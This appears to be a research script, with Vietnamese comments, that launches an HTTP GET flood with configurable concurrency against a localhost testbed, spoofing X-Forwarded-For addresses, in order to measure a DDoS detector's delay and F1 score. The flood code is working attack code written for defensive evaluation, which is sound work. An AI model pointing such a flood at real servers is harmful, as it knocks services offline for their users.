"""
experiments/attack_get_flood_variable.py
CHỈ dùng để tấn công server localhost trong testbed của chính bạn.

4.1.2 / 4.3.2 - HTTP GET Flood với cường độ tham số hoá (số connection đồng thời),
để đo detection delay và F1 thay đổi thế nào theo mức độ tấn công - cho ra
biểu đồ "detection delay vs attack intensity" rất có giá trị cho 4.3.2/4.4.

Chạy:
    python experiments/attack_get_flood_variable.py --concurrency 50 --duration 20
    python experiments/attack_get_flood_variable.py --concurrency 500 --duration 20
"""
import argparse
import asyncio
import random
import time
from pathlib import Path

import aiohttp

TARGET = "http://localhost:8000/"
LOG_DIR = Path(__file__).resolve().parent.parent / "logs"
LOG_DIR.mkdir(exist_ok=True)


async def flood_worker(session, stop_at, fake_ip):
    headers = {"X-Forwarded-For": fake_ip}
    while time.time() < stop_at:
        try:
            async with session.get(TARGET, headers=headers) as resp:
                await resp.read()
        except Exception:
            pass


async def main(concurrency: int, duration_s: int):
    start = time.time()
    with open(LOG_DIR / "attack_start.log", "a") as f:
        f.write(f"get_flood_c{concurrency}_start\t{start}\n")

    stop_at = start + duration_s
    async with aiohttp.ClientSession() as session:
        workers = [
            flood_worker(session, stop_at, f"10.0.{random.randint(0, 9)}.{i % 255}")
            for i in range(concurrency)
        ]
        await asyncio.gather(*workers)

    print(f"GET flood (concurrency={concurrency}) xong sau {duration_s}s, bắt đầu lúc {start}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--concurrency", type=int, default=200)
    parser.add_argument("--duration", type=int, default=30)
    args = parser.parse_args()
    asyncio.run(main(args.concurrency, args.duration))
